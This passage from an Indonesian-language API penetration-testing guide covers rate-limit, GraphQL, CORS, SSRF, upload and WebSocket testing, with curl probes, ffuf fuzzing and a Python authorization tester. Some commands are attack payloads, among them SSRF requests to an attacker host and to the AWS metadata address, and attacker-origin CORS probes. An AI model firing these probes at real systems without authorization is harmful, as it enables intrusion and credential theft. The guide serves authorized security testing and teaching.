  'http://TARGET/api/v1/login'
```

Repeated controlled testing:

```text
1
2
3
...
N
```

Cari:

```text
429 Too Many Requests
Retry-After
temporary lockout
increasing latency
```

---

## X-Forwarded-For Rotation

### 📌 Kapan Digunakan

Hanya untuk menguji apakah application **salah mempercayai client-supplied IP headers**.

```bash
# Test whether the application trusts X-Forwarded-For
curl -i \
  -H 'X-Forwarded-For: 10.10.10.10' \
  'http://TARGET/api/v1/login'
```

Kemudian:

```bash
# Change the claimed client address
curl -i \
  -H 'X-Forwarded-For: 10.10.10.11' \
  'http://TARGET/api/v1/login'
```

Perubahan response tidak otomatis membuktikan bypass.

---

## Endpoint Variation

```text
/api/login
/api/v1/login
/api/v2/login
```

Test:

```bash
# Compare rate limiting across API versions
curl -i 'http://TARGET/api/login'
curl -i 'http://TARGET/api/v1/login'
curl -i 'http://TARGET/api/v2/login'
```

---

## Case Variation

```text
/api/Login
/api/LOGIN
```

Hanya relevan jika router/proxy application memperlakukan case secara tidak konsisten.

---

## Controlled Rate-Limit Script

```bash
#!/usr/bin/env bash
# Controlled rate-limit observation tool for authorized labs.

set -u

if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <url> <count>"
    exit 1
fi

URL="$1"
COUNT="$2"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo "[!] URL must start with http:// or https://"
    exit 1
fi

if [[ ! "$COUNT" =~ ^[0-9]+$ ]]; then
    echo "[!] Count must be numeric"
    exit 1
fi

if (( COUNT < 1 || COUNT > 100 )); then
    echo "[!] Count must be between 1 and 100"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is required"
    exit 1
fi

for ((i=1; i<=COUNT; i++)); do
    # One deliberately controlled request per iteration.
    RESULT="$(
        curl -ksS \
          --max-time 10 \
          -o /dev/null \
          -w '%{http_code} %{time_total}' \
          "$URL" \
          || echo "000 10"
    )"

    echo "Request $i: $RESULT"

    # Keep traffic intentionally slow for safe lab observation.
    sleep 0.2
done
```

Run:

```bash
# Make the script executable
chmod +x rate_limit_test.sh

# Observe up to 20 requests
./rate_limit_test.sh \
  'http://TARGET/api/v1/test' \
  20
```

Example:

```text
Request 1: 200 0.091
Request 2: 200 0.084
Request 3: 200 0.089
Request 4: 429 0.078
Request 5: 429 0.076
```

---

# 5.2 API Versioning Abuse

## 📌 Kapan Digunakan

Saat menemukan:

```text
/v1/
/v2/
/v3/
/internal/
```

Older APIs sering memiliki:

```text
different auth
different validation
different fields
```

---

## Compare Versions

```bash
# Compare version 1
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer USER_TOKEN'

# Compare version 2
curl -i \
  'http://TARGET/api/v2/profile' \
  -H 'Authorization: Bearer USER_TOKEN'
```

---

## Internal Endpoint

```bash
# Test whether an advertised/internal endpoint is externally reachable
curl -i \
  'http://TARGET/api/internal/profile' \
  -H 'Authorization: Bearer USER_TOKEN'
```

---

# 5.3 Business Logic via API

## 📌 Kapan Digunakan

Saat API mewakili proses bisnis:

```text
cart
checkout
coupon
transfer
booking
quantity
refund
approval
```

---

## Price Manipulation

Expected:

```json
{
  "product_id": 10,
  "quantity": 1
}
```

Potential insecure design:

```json
{
  "product_id": 10,
  "quantity": 1,
  "price": 1
}
```

Test:

```bash
# Test whether client-supplied price is trusted
curl -i \
  -X POST \
  'http://TARGET/api/v1/cart' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"product_id":10,"quantity":1,"price":1}'
```

Secure server:

```text
price = database/product catalog
```

not:

```text
price = client input
```

---

## Quantity Abuse

```bash
# Test a boundary quantity in a lab
curl -i \
  -X POST \
  'http://TARGET/api/v1/cart' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"product_id":10,"quantity":0}'
```

Then:

```bash
# Test another controlled boundary
curl -i \
  -X POST \
  'http://TARGET/api/v1/cart' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"product_id":10,"quantity":-1}'
```

---

## Coupon Stacking

Normal:

```text
coupon=SAVE10
```

Test whether backend accepts:

```text
SAVE10
SAVE20
SAVE10 + SAVE20
```

Request:

```bash
# Test one coupon
curl -i \
  -X POST \
  'http://TARGET/api/v1/cart/coupon' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data '{"coupon":"SAVE10"}'
```

---

## Workflow Bypass

```text
Create
  ↓
Pay
  ↓
Confirm
  ↓
Ship
```

Test apakah:

```text
Ship
```

dapat dipanggil sebelum:

```text
Pay
```

```bash
# Test whether the final workflow action enforces previous state
curl -i \
  -X POST \
  'http://TARGET/api/v1/orders/1001/ship' \
  -H 'Authorization: Bearer USER_TOKEN'
```

Expected secure:

```http
HTTP/1.1 409 Conflict
```

Potential issue:

```http
HTTP/1.1 200 OK
```

---

# 🕸️ 6. GraphQL Security

# 6.1 GraphQL Fundamentals

## 📌 Kapan Digunakan

Saat API menggunakan GraphQL.

---

## Query

Mengambil data:

```graphql
query {
  user(id: 1) {
    id
    username
  }
}
```

---

## Mutation

Mengubah data:

```graphql
mutation {
  updateProfile(
    id: 1,
    username: "alice"
  ) {
    id
  }
}
```

---

## Subscription

Real-time stream:

```graphql
subscription {
  messageCreated {
    id
    body
  }
}
```

---

## Introspection

```text
GraphQL
   │
   ▼
__schema
   │
   ▼
Types
 │
 ├── Query
 ├── Mutation
 └── Subscription
```

---

## Aliases

```graphql
query {
  first: user(id: 1) {
    id
  }

  second: user(id: 2) {
    id
  }
}
```

Satu operation dapat meminta object berbeda.

---

## Batching

Beberapa operations dapat dikirim dalam satu request pada implementation tertentu.

Concept:

```json
[
  {
    "query": "{ user(id:1) { id } }"
  },
  {
    "query": "{ user(id:2) { id } }"
  }
]
```

Rate-limiting layer perlu menangani batching dengan benar.

---

# 6.2 GraphQL Attack Techniques

# Introspection

### 📌 Kapan Digunakan

Untuk mengetahui schema sebelum melakukan authorization testing.

```bash
# Query GraphQL schema metadata
curl -s \
  -X POST \
  'http://TARGET/graphql' \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ __schema { queryType { name } types { name kind } } }"}'
```

---

# Query/Mutation Discovery

### 📌 Kapan Digunakan

Setelah schema diperoleh.

Contoh:

```text
Query:
users
orders
profile

Mutation:
updateUser
deleteUser
approveOrder
```

Pertanyaan:

```text
"Apakah authorization diperiksa per resolver?"
```

---

# Query Batching

### 📌 Kapan Digunakan

Saat ingin menguji apakah rate limiter menghitung:

```text
request
```

atau:

```text
individual operation
```

```bash
# Send two harmless operations in one batch request
curl -i \
  -X POST \
  'http://TARGET/graphql' \
  -H 'Content-Type: application/json' \
  --data '[
    {"query":"{ health }"},
    {"query":"{ health }"}
  ]'
```

---

# Alias Rate-Limit Testing

### 📌 Kapan Digunakan

Saat resolver sama dapat dipanggil berkali-kali melalui alias.

```bash
# Test multiple harmless aliases against a lab schema
curl -i \
  -X POST \
  'http://TARGET/graphql' \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ a:health b:health c:health }"}'
```

Potential issue:

```text
rate limit = per HTTP request
instead of per expensive resolver operation
```

---

# Injection via GraphQL

### 📌 Kapan Digunakan

GraphQL bukan sanitizer.

Input resolver dapat tetap masuk ke:

```text
SQL
NoSQL
Template
OS commands
```

Contoh query:

```graphql
query {
  search(q: "test'") {
    id
  }
}
```

```bash
# Test a GraphQL variable for SQL-like error behavior
curl -i \
  -X POST \
  'http://TARGET/graphql' \
  -H 'Content-Type: application/json' \
  --data '{"query":"query($q:String!){search(q:$q){id}}","variables":{"q":"test'\''"}}'
```

---

# GraphQL CSRF

### 📌 Kapan Digunakan

Saat GraphQL menggunakan cookie authentication dan request dapat dibentuk cross-origin tanpa effective CSRF defense.

Cross-reference:

```text
→ [File 29: CSRF](/docs/csrf)
```

---

# Deep Nested Query / DoS

### 📌 Kapan Digunakan

Saat schema memiliki relationship recursive/deep.

Concept:

```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends {
            id
          }
        }
      }
    }
  }
}
```

Test hanya pada lab dengan depth kecil.

```bash
# Send a shallow nested query to measure baseline complexity
curl -i \
  -X POST \
  'http://TARGET/graphql' \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ user { friends { id } } }"}'
```

Cari:

```text
query depth limit
complexity limit
timeout
resource exhaustion
```

---

# 6.3 GraphQL Tools

|Tool|Kegunaan|
|---|---|
|InQL|GraphQL schema/query testing dalam Burp|
|graphql-cop|Security audit checks|
|clairvoyance|Schema discovery ketika introspection disabled|
|GraphQL Voyager|Visualisasi schema|

---

## InQL

```text
Burp
 ↓
Extensions
 ↓
BApp Store
 ↓
InQL
 ↓
GraphQL request
```

---

## graphql-cop

```bash
# Clone audit tool for lab use
git clone https://github.com/dolevf/graphql-cop.git

# Enter project
cd graphql-cop

# Inspect available arguments
python3 graphql-cop.py --help
```

---

## clairvoyance

CLI/version dapat berbeda. Mulai dari:

```bash
# Inspect installed/help information
clairvoyance --help
```

atau sesuai repository/tool version.

---

# 🌍 7. CORS & API

# 7.1 CORS Misconfiguration di API

## 📌 Kapan Digunakan

Saat API mengembalikan header:

```http
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
```

---

## Wildcard + Credentials

Misconfiguration:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Browser modern tidak mengizinkan credentialed response dibaca ketika `Allow-Origin` bernilai `*`, tetapi konfigurasi tersebut tetap perlu dinilai dalam konteks API.

---

## Origin Reflection

Test:

```bash
# Send an attacker-controlled Origin header
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Origin: https://attacker.example'
```

Cari:

```http
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
```

Ini adalah candidate misconfiguration.

---

## Null Origin

```bash
# Test null Origin handling
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Origin: null'
```

Potentially dangerous:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## Trusted Subdomain

```bash
# Test a lab-controlled trusted subdomain origin
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Origin: https://sub.target.example'
```

Question:

```text
Does trusted origin actually belong to the same security boundary?
```

---

## Relationship with CSRF

```text
CORS
 │
 └── controls response read access

CSRF
 │
 └── controls unwanted state-changing requests
```

Cross-reference:

```text
→ [File 29: CSRF](/docs/csrf)
```

Detailed CORS workflow:

```text
→ [File 33: CORS](/docs/cors)
```

---

# ⚙️ 8. API-Specific Vulnerabilities

# 8.1 SSRF via API

## 📌 Kapan Digunakan

Cari parameter:

```text
url
uri
image_url
callback
webhook
target
fetch
```

Cross-reference:

```text
→ [File 22: SSRF](/docs/ssrf)
```

---

## Basic

```bash
# Send an attacker-controlled URL to the lab fetch endpoint
curl -i \
  -X POST \
  'http://TARGET/api/fetch' \
  -H 'Content-Type: application/json' \
  --data '{"url":"http://ATTACKER:8000/test"}'
```

---

## Internal

```bash
# Test localhost reachability in an authorized lab
curl -i \
  -X POST \
  'http://TARGET/api/fetch' \
  -H 'Content-Type: application/json' \
  --data '{"url":"http://127.0.0.1:8080/"}'
```

---

## Cloud Metadata

```bash
# Test AWS metadata access in a dedicated cloud lab
curl -i \
  -X POST \
  'http://TARGET/api/fetch' \
  -H 'Content-Type: application/json' \
  --data '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

---

# 8.2 File Upload via API

## 📌 Kapan Digunakan

Saat API memiliki:

```text
POST /upload
POST /api/files
POST /avatar
```

---

## Multipart

```bash
# Upload a benign lab file
curl -i \
  -X POST \
  'http://TARGET/api/upload' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -F 'file=@test.txt;type=text/plain'
```

---

## Binary Upload

```bash
# Upload binary content while preserving the lab filename
curl -i \
  -X POST \
  'http://TARGET/api/upload' \
  -H 'Authorization: Bearer USER_TOKEN' \
  -H 'Content-Type: application/octet-stream' \
  --data-binary '@test.bin'
```

---

## Extension Validation

Test controlled filenames:

```text
test.txt
test.jpg
test.svg
test.txt.jpg
test.jpg.txt
```

Question:

```text
Does server validate:
extension
MIME
magic bytes
content
storage location
execution behavior?
```

---

# 8.3 WebSocket Security

## 📌 Kapan Digunakan

Saat API menggunakan:

```text
ws://
wss://
```

atau browser WebSocket connections.

Cross-reference ke environment lab:

```text
websocat
```

---

## Authentication

Periksa:

```text
Cookie
Authorization
query token
Sec-WebSocket-Protocol
```

---

## websocat Install

Jika `websocat` tidak tersedia di repository default Parrot OS, gunakan salah satu cara berikut:

```bash
# Option 1: Install dari Cargo (Rust package manager)
cargo install websocat

# Option 2: Download binary langsung dari GitHub Release
wget https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl
chmod +x websocat.x86_64-unknown-linux-musl
sudo mv websocat.x86_64-unknown-linux-musl /usr/local/bin/websocat
```

---

## Connect

```bash
# Connect to a WebSocket endpoint
websocat \
  'ws://TARGET/socket'
```

Expected:

```text
connected
```

---

## Message Manipulation

Misalnya normal:

```json
{
  "action": "get_profile"
}
```

Test:

```json
{
  "action": "get_admin"
}
```

Atau object id:

```json
{
  "action": "get_order",
  "id": 1002
}
```

Authorization harus berlaku pada message level juga.

---

## Cross-Site WebSocket Hijacking

### 📌 Kapan Digunakan

Saat WebSocket menggunakan cookie authentication dan origin validation buruk.

Flow:

```text
Attacker Page
      │
      ▼
WebSocket("wss://TARGET")
      │
      ▼
Browser sends cookie
      │
      ▼
Target WebSocket
```

Check:

```text
Origin validation
Cookie SameSite
CSRF-like protections
authentication binding
```

---

# 🧰 9. Tools & Automation

# 9.1 Burp Suite untuk API

## 📌 Kapan Digunakan

Burp adalah tool utama untuk:

```text
REST
GraphQL
JSON
Cookies
JWT
Authorization
```

---

## REST Workflow

```text
Browser
  ↓
Proxy
  ↓
HTTP history
  ↓
Repeater
  ↓
Modify:
  ├── ID
  ├── method
  ├── header
  ├── body
  └── token
```

---

## GraphQL

```text
GraphQL request
      ↓
Repeater
      ↓
Change query
      ↓
Change variables
      ↓
Compare authorization
```

---

## Intruder

Untuk parameter discovery:

```text
ID
role
version
endpoint
```

Gunakan secara terkendali dalam lab/bug bounty.

---

## Useful Extensions

```text
InQL
JSON Web Tokens
Autorize
Logger++
```

---

# 9.2 curl Cheatsheet untuk API Testing

# GET

```bash
# Basic GET
curl -i 'http://TARGET/api/v1/users'
```

# POST JSON

```bash
# Create a JSON object
curl -i \
  -X POST \
  'http://TARGET/api/v1/users' \
  -H 'Content-Type: application/json' \
  --data '{"username":"alice"}'
```

# PUT

```bash
# Replace/update a resource
curl -i \
  -X PUT \
  'http://TARGET/api/v1/users/10' \
  -H 'Content-Type: application/json' \
  --data '{"username":"alice"}'
```

# PATCH

```bash
# Partially modify a resource
curl -i \
  -X PATCH \
  'http://TARGET/api/v1/users/10' \
  -H 'Content-Type: application/json' \
  --data '{"display_name":"Alice"}'
```

# DELETE

```bash
# Delete a resource in a lab
curl -i \
  -X DELETE \
  'http://TARGET/api/v1/users/10'
```

# JSON Headers

```bash
# Request and return JSON
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Accept: application/json'
```

# Authorization

```bash
# Bearer token
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Authorization: Bearer LAB_TOKEN'
```

# API Key

```bash
# API key header
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'X-API-Key: LAB_KEY'
```

# Cookie

```bash
# Cookie-authenticated API request
curl -i \
  'http://TARGET/api/v1/profile' \
  -H 'Cookie: session=LAB_SESSION'
```

# Follow Redirect

```bash
# Follow HTTP redirects
curl -i -L \
  'http://TARGET/api/v1/login'
```

# Verbose

```bash
# Show connection/request details
curl -v \
  'http://TARGET/api/v1/profile'
```

# Headers Only

```bash
# Inspect response headers
curl -I \
  'http://TARGET/api/v1/profile'
```

# Save Response

```bash
# Save JSON response for jq analysis
curl -s \
  'http://TARGET/api/v1/profile' \
  -o response.json

# Pretty-print JSON
jq . response.json
```

---

# 9.3 Python Script `api_tester.py`

## 📌 Kapan Digunakan

Script ini digunakan untuk **recon dan authorization validation pada lab**, bukan untuk brute-force authentication.

Fungsi:

```text
common API endpoint discovery
basic authentication baseline
BOLA comparison dengan dua token
```

Input validation:

```text
URL scheme
hostname
ID numeric
token format
```

```python
#!/usr/bin/env python3

import argparse
import sys
from urllib.parse import urljoin, urlparse

import requests


COMMON_ENDPOINTS = [
    "/api/",
    "/api/v1/",
    "/api/v2/",
    "/api/users",
    "/api/v1/users",
    "/api/profile",
    "/api/v1/profile",
    "/api/orders",
    "/api/v1/orders",
    "/graphql",
    "/swagger.json",
    "/openapi.json",
]


def valid_base_url(value: str) -> str:
    parsed = urlparse(value)

    if parsed.scheme not in {"http", "https"}:
        raise argparse.ArgumentTypeError(
            "URL must start with http:// or https://"
        )

    if not parsed.netloc:
        raise argparse.ArgumentTypeError(
            "URL must contain a hostname"
        )

    if any(ch.isspace() for ch in value):
        raise argparse.ArgumentTypeError(
            "URL cannot contain whitespace"
        )

    return value.rstrip("/") + "/"


def valid_token(value: str) -> str:
    if not value:
        raise argparse.ArgumentTypeError(
            "Token cannot be empty"
        )

    if any(ch in value for ch in "\r\n"):
        raise argparse.ArgumentTypeError(
            "Token cannot contain CR/LF"
        )

    return value


def valid_id(value: str) -> str:
    if not value.isdigit():
        raise argparse.ArgumentTypeError(
            "Object ID must be numeric"
        )

    if int(value) < 0:
        raise argparse.ArgumentTypeError(
            "Object ID must be non-negative"
        )

    return value


def request(session, method, url, headers=None, timeout=5):
    try:
        response = session.request(
            method,
            url,
            headers=headers or {},
            timeout=timeout,
            allow_redirects=False,
        )

        return response

    except requests.RequestException as exc:
        print(f"[!] Request failed: {exc}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description=(
            "API recon and authorization tester "
            "for authorized labs."
        )
    )

    parser.add_argument(
        "base_url",
        type=valid_base_url,
        help="API base URL"
    )

    parser.add_argument(
        "--token-a",
        type=valid_token,
        help="Authorized User A bearer token"
    )

    parser.add_argument(
        "--token-b",
        type=valid_token,
        help="Authorized User B bearer token"
    )

    parser.add_argument(
        "--bola-path",
        default="/api/v1/users/{id}",
        help="Object endpoint containing {id}"
    )

    parser.add_argument(
        "--object-a",
        type=valid_id,
        help="Object ID owned by User A"
    )

    return_args = parser.parse_args()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "API-Lab-Tester/1.0",
        "Accept": "application/json",
    })

    print("\n=== API ENDPOINT DISCOVERY ===")

    for endpoint in COMMON_ENDPOINTS:
        url = urljoin(
            return_args.base_url,
            endpoint.lstrip("/")
        )

        response = request(
            session,
            "GET",
            url
        )

        if response is None:
            continue

        status = response.status_code

        if status in {
            200, 201, 204,
            301, 302, 307, 308,
            401, 403
        }:
            print(
                f"[+] {endpoint:<25} "
                f"{status}"
            )
        else:
            print(
                f"[-] {endpoint:<25} "
                f"{status}"
            )

    print("\n=== AUTHENTICATION BASELINE ===")

    profile_url = urljoin(
        return_args.base_url,
        "api/v1/profile"
    )

    unauth = request(
        session,
        "GET",
        profile_url
    )

    if unauth is not None:
        print(
            f"[+] No-token request: "
            f"{unauth.status_code}"
        )

    if return_args.token_a:
        headers_a = {
            "Authorization":
                f"Bearer {return_args.token_a}"
        }

        auth_a = request(
            session,
            "GET",
            profile_url,
            headers=headers_a
        )

        if auth_a is not None:
            print(
                f"[+] User A profile: "
                f"{auth_a.status_code}"
            )

    print("\n=== BOLA TEST ===")

    if (
        return_args.token_a
        and return_args.token_b
        and return_args.object_a
    ):

        object_path = (
            return_args.bola_path
            .replace(
                "{id}",
                return_args.object_a
            )
        )

        object_url = urljoin(
            return_args.base_url,
            object_path.lstrip("/")
        )

        headers_a = {
            "Authorization":
                f"Bearer {return_args.token_a}"
        }

        headers_b = {
            "Authorization":
                f"Bearer {return_args.token_b}"
        }

        response_a = request(
            session,
            "GET",
            object_url,
            headers=headers_a
        )

        response_b = request(
            session,
            "GET",
            object_url,
            headers=headers_b
        )

        if response_a is not None:
            print(
                "[User A] "
                f"{response_a.status_code}"
            )

        if response_b is not None:
            print(
                "[User B] "
                f"{response_b.status_code}"
            )

            if response_b.status_code == 200:
                print(
                    "[!] BOLA candidate: "
                    "User B can access User A object"
                )
            else:
                print(
                    "[+] Object access blocked "
                    "for User B"
                )

    else:
        print(
            "[*] BOLA test skipped. "
            "Provide --token-a, --token-b "
            "and --object-a."
        )

    print("\n=== DONE ===")
    print(
        "[*] Manually validate every interesting "
        "response in Burp."
    )


if __name__ == "__main__":
    main()
```

Install:

```bash
# Install requests dependency
python3 -m pip install requests
```

Run:

```bash
# Make the script executable
chmod +x api_tester.py

# Run endpoint discovery only
python3 api_tester.py \
  'http://TARGET'
```

BOLA test:

```bash
# Compare User A vs User B access to User A's object
python3 api_tester.py \
  'http://TARGET' \
  --token-a 'USER_A_TOKEN' \
  --token-b 'USER_B_TOKEN' \
  --bola-path '/api/v1/orders/{id}' \
  --object-a '1001'
```

Expected:

```text
=== API ENDPOINT DISCOVERY ===
[+] /api/                    200
[+] /api/v1/                 200
[+] /api/v1/profile         401
[+] /graphql                 200
[+] /swagger.json            200

=== AUTHENTICATION BASELINE ===
[+] No-token request: 401
[+] User A profile: 200

=== BOLA TEST ===
[User A] 200
[User B] 403
[+] Object access blocked for User B
```

Potential vulnerable output:

```text
[User A] 200
[User B] 200
[!] BOLA candidate: User B can access User A object
```

**200/403 saja belum cukup.** Bandingkan actual object ownership/content.

---

# 9.4 ffuf untuk API Fuzzing

## 📌 Kapan Digunakan

Tiga mode utama:

```text
endpoint fuzzing
parameter fuzzing
value fuzzing
```

---

## Endpoint Discovery

```bash
# Discover API endpoints
ffuf \
  -u 'http://TARGET/api/FUZZ' \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,307,401,403
```

---

## Parameter Fuzzing

Misalnya:

```text
/api/search?FUZZ=test
```

```bash
# Discover parameter names
ffuf \
  -u 'http://TARGET/api/search?FUZZ=test' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,400,401,403
```

---

## Value Fuzzing

```bash
# Fuzz a parameter value
ffuf \
  -u 'http://TARGET/api/user?id=FUZZ' \
  -w ids.txt \
  -mc 200,403,404
```

---

## JSON Value Fuzzing

```bash
# Fuzz a JSON value from a wordlist
ffuf \
  -u 'http://TARGET/api/search' \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"role":"FUZZ"}' \
  -w roles.txt \
  -mc 200,400,401,403
```

---

## Rate-Limiting Observation

Gunakan rate kecil:

```bash
# Observe API responses at a controlled rate
ffuf \
  -u 'http://TARGET/api/test?value=FUZZ' \
  -w small-list.txt \
  -rate 2 \
  -mc 200,400,401,403,429
```

Jangan menganggap:

```text
-fuzzing
=
rate-limit bypass
```

Tool hanya menghasilkan traffic; apakah limit dapat dibypass adalah finding terpisah.

---

# 🌳 10. Decision Tree

## API Security Master Decision Tree

```text
API DITEMUKAN
      │
      ▼
Identify API Type
      │
 ┌────┼────────┬────────┐
 ▼    ▼        ▼        ▼
REST GraphQL  SOAP      gRPC
 │      │       │         │
 │      │       │         └── method/auth metadata
 │      │       │
 │      │       └── XML parser / auth
 │      │
 │      └── schema / resolver / mutation
 │
 ▼
Build Endpoint Inventory
 │
 ├── JS
 ├── Burp
 ├── Swagger
 ├── robots
 ├── mobile app
 └── fuzzing
 │
 ▼
Authentication?
 │
 ├── API Key
 ├── JWT
 ├── OAuth
 ├── Cookie
 ├── Basic
 └── HMAC
 │
 ▼
Authorization
 │
 ├── Object?
 │      │
 │      ▼
 │     BOLA
 │
 ├── Function?
 │      │
 │      ▼
 │     BFLA
 │
 └── Property?
        │
        ▼
   Mass Assignment /
   Property Authorization
 │
 ▼
Input Validation
 │
 ├── SQLi
 ├── NoSQLi
 ├── SSTI
 ├── Command Injection
 ├── XXE
 └── Type/Parameter bugs
 │
 ▼
Resource Controls
 │
 ├── Rate Limit
 ├── Pagination
 ├── Query Complexity
 └── Upload limits
 │
 ▼
Business Logic
 │
 ├── Price
 ├── Quantity
 ├── Coupon
 ├── Workflow
 └── Sensitive business flow
 │
 ▼
API-Specific
 │
 ├── SSRF
 ├── CORS
 ├── WebSocket
 ├── File Upload
 └── Versioning
 │
 ▼
Impact
```

---

## Authentication Decision Tree

```text
Protected Endpoint
      │
      ▼
No credentials
      │
 ┌────┴────┐
401       200
 │          │
 ▼          ▼
Expected   Missing Auth
      │
      ▼
Valid Credential
      │
      ▼
Invalid Credential
      │
 ┌────┴────┐
401       200
 │          │
 ▼          ▼
Expected   Auth bypass candidate
```

---

## Authorization Decision Tree

```text
Authenticated
     │
     ▼
Change OBJECT
     │
 ┌───┴───┐
YES      NO
 │        │
 ▼        ▼
BOLA    Change FUNCTION
          │
      ┌───┴───┐
     YES      NO
      │        │
      ▼        ▼
     BFLA    Change PROPERTY
                │
                ▼
          Mass Assignment /
          Property Auth
```

---

## Input Validation Decision Tree

```text
API Input
   │
   ▼
Where does it go?
   │
 ┌─┼──────────┬─────────┐
 ▼ ▼          ▼         ▼
SQL NoSQL    Template   OS
 │   │         │         │
 ▼   ▼         ▼         ▼
SQLi NoSQLi   SSTI      Cmd Injection
```

---

# 🛠️ 11. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|`401 Unauthorized`|Credential missing/invalid|Tambahkan atau perbaiki authentication|
|`403 Forbidden`|Credential valid tetapi tidak authorized|Analisis sebagai authorization boundary|
|401 vs 403 tidak konsisten|Middleware berbeda antar endpoint|Bandingkan endpoint dan method|
|CORS error|Browser memblok response/read|Pisahkan CORS dari server-side request behavior|
|Rate limit 429|Too many requests|Perlambat traffic dan dokumentasikan threshold|
|Invalid JSON|Syntax/type salah|Validasi JSON dengan `jq`|
|Token expired|JWT/OAuth expiration|Ambil token baru dan catat TTL|
|JWT signature invalid|Secret/key/alg salah|Verifikasi token structure|
|Endpoint 404|Path/version salah|Cek Swagger, JS, Burp history|
|Endpoint 405|Method salah|Uji GET/POST/PUT/PATCH/DELETE|
|BOLA test gagal|Object memang protected|Pastikan object benar-benar milik User A|
|BFLA test mendapat 403|Authorization bekerja|Cari function lain untuk role comparison|
|Mass assignment tidak berpengaruh|Field ignored/allowlist|Inspect response dan actual state|
|API return terlalu banyak data|Serializer terlalu luas|Bandingkan dengan UI/required fields|
|GraphQL introspection disabled|Production hardening|Enumerate known queries / schema clues|
|GraphQL query error|Schema/query mismatch|Inspect schema dan exact types|
|GraphQL batching rejected|Implementation disables batching|Test single query vs aliases|
|Swagger tidak accessible|Docs disabled externally|Cari OpenAPI file/JS/API traffic|
|API version lama masih aktif|Inventory management issue|Bandingkan auth/validation v1 vs v2|
|File upload 415|Content-Type unsupported|Use endpoint's expected media type|
|WebSocket disconnects|Auth/origin/protocol issue|Inspect handshake headers|
|`jq` parse error|Response bukan JSON|Inspect raw `curl -i` output|
|ffuf terlalu banyak false positives|Baseline response generic|Filter status/size/words|
|ffuf tidak menemukan endpoint|Wrong wordlist/path prefix|Use API-specific list and JS recon|
|API key works in unexpected endpoint|Weak scoping|Test key privileges across endpoints|
|OAuth scope ignored|Server does not enforce scope|Compare token scopes|
|HMAC request rejected|Canonicalization/signature mismatch|Rebuild exact signing input|
|Duplicate JSON key behaves oddly|Parser difference|Record which value application uses|
|Array accepted where scalar expected|Type validation weak|Compare scalar/array behavior|
|Integer boundary crashes endpoint|Overflow/validation issue|Reproduce with smallest boundary value|
|JSON CSRF blocked|Browser/CORS/preflight issue|Analyze actual request and browser policy|
|Internal SSRF endpoint returns 502|Downstream unreachable|Compare known open/closed internal services|
|API accepts `X-Forwarded-For` blindly|Proxy trust misconfiguration|Test whether security decision changes|
|`403` on admin function|Proper authorization|Compare with admin session to confirm boundary|

---

# 📏 12. Golden Rules

```text
1. API endpoint ≠ authorized endpoint.
```

```text
2. Authentication answers "who"; authorization answers "what can they do?"
```

```text
3. BOLA = object boundary.
```

```text
4. BFLA = function boundary.
```

```text
5. Property authorization is a separate dimension.
```

```text
6. Never trust client-supplied role/isAdmin/price/balance fields.
```

```text
7. 401 normally means authentication problem.
```

```text
8. 403 normally indicates an authorization/policy decision.
```

```text
9. 200 does not mean authorization passed correctly.
```

```text
10. Swagger exposure does not automatically mean endpoint exploitation.
```

```text
11. Every API version belongs in the inventory.
```

```text
12. JSON does not make injection impossible.
```

```text
13. JWT does not automatically make an API authorization-safe.
```

```text
14. CORS is not an authentication mechanism.
```

```text
15. SameSite is not equivalent to API authorization.
```

```text
16. Test the object, property, function, and workflow separately.
```

```text
17. Compare User A and User B whenever authorization is involved.
```

```text
18. Validate business state, not only HTTP status codes.
```

---

# ✅ 13. Final Checklist

```text
[ ] API inventory created
[ ] REST endpoints identified
[ ] GraphQL endpoint identified
[ ] SOAP endpoints identified
[ ] WebSocket endpoints identified
[ ] API versions identified
[ ] Swagger identified
[ ] OpenAPI identified
[ ] Redoc identified
[ ] Postman collections searched
[ ] JavaScript endpoint references extracted
[ ] Authentication type documented
[ ] API key tested
[ ] Bearer/JWT tested
[ ] OAuth flow documented
[ ] Cookie auth tested
[ ] HMAC behavior understood
[ ] Unauthenticated access tested
[ ] User A session obtained
[ ] User B session obtained
[ ] BOLA tested
[ ] BFLA tested
[ ] Property authorization tested
[ ] Mass assignment tested
[ ] Excessive data exposure tested
[ ] SQL injection candidates tested
[ ] NoSQL injection candidates tested
[ ] SSTI candidates tested
[ ] Command injection candidates tested
[ ] Parameter pollution tested
[ ] Type confusion tested
[ ] Integer boundaries tested
[ ] Rate limiting threshold documented
[ ] API version security compared
[ ] Business logic mapped
[ ] Price manipulation tested
[ ] Quantity manipulation tested
[ ] Coupon logic tested
[ ] Workflow ordering tested
[ ] GraphQL introspection tested
